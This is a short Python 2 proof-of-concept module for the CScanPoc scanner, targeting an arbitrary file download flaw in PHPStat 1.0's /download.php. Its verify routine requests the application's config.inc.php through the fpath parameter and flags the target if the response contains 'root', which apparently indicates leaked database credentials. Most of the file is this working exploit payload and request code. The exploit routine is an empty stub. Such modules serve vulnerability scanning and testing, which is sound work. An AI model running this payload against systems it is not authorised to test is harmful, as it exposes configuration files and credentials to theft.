# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    vuln_id = 'PHPStat_0001' # 平台漏洞编号，留空
    name = 'PHPStat 1.0 /download.php 任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-11-13'  # 漏洞公布时间
    desc = '''
        PHPStat v1.0.20141124 /download.php 任意文件下载。
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/2372/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'PHPStat'  # 漏洞应用名称
    product_version = '1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9d33ba00-2b14-489a-932e-35d2655afdec'
    author = '国光'  # POC编写者
    create_date = '2018-05-10' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/download.php?fname=1.txt&fpath=./include.inc/config.inc.php'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if 'root' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()